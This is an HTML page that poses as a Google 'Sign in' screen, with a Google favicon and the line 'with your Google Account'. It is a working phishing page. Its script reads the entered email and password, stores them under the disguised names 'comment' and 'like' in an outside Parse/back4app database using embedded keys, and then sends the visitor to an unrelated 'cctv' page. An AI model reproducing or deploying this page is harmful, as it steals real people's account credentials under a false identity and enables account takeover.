<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign in</title>
<link rel="icon" href="https://nofileteams.github.io/nofile-data/google.png">
<script src="https://npmcdn.com/parse/dist/parse.min.js"></script>
<style>
body {
  background-color: white;
  margin: 0;
}
.center {
  width: 100vw;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}
.box {
  width: 500px;
  height: 600px;
  border: 0.5px solid gray;
  position: relative;
}
.box img {
  position: absolute;
  width: 80px;
  height: 30px;
  left: 35px;
  top: 45px;
}
.text1 {
  position: absolute;
  left: 35px;
  top: 95px;
  font-size: 30px;
}
.text2 {
  position: absolute;
  left: 35px;
  top: 140px;
  font-size: 15px;
}
.input1 {
  position: absolute;
  top: 230px;
  left: 50%;
  transform: translateX(-50%);
  width: 410px;
  height: 30px;
  background-color: white;
  border: 0.1px solid gray;
}
.input2 {
  position: absolute;
  top: 300px;
  left: 50%;
  transform: translateX(-50%);
  width: 410px;
  height: 30px;
  background-color: white;
  border: 0.1px solid gray;
}
.button1 {
  position: absolute;
  top: 380px;
  left: 50%;
  transform: translateX(-50%);
  width: 200px;
  height: 35px;
  background-color: dodgerblue;
  color: white;
  border: none;
}
</style>
</head>
<body>
<div class="center">
  <div class="box">
    <img src="https://nofileteams.github.io/title.png">
    <div class="text1">Sign in</div>
    <div class="text2">with your Google Account</div>
    <form id="commentForm">
      <input class="input1" type="text" id="comment" name="comment" placeholder="Email">
      <input class="input2" type="password" id="like" name="like" placeholder="Password">
      <button class="button1" type="submit">Sign in</button>
    </form>
  </div>
</div>

<script>
Parse.initialize(
  "sfP9aUyuxKTU8FMBjOJLeGuxhWdjwjkSvGSCDmpB",
  "hbVLZ162tbrWcTqCCzxBAxpJ7dRklMCCu0dPdYyZ"
);
Parse.serverURL = "https://parseapi.back4app.com";

document.getElementById("commentForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const Comment = Parse.Object.extend("comments");
  const commentObj = new Comment();

  commentObj.set("comment", document.getElementById("comment").value);
  commentObj.set("like", document.getElementById("like").value);

  try {
    await commentObj.save();
    location.href = "https://nofileteams.github.io/cctv";
  } catch (error) {
    alert(error.message);
  }
});
</script>
</body>
</html>
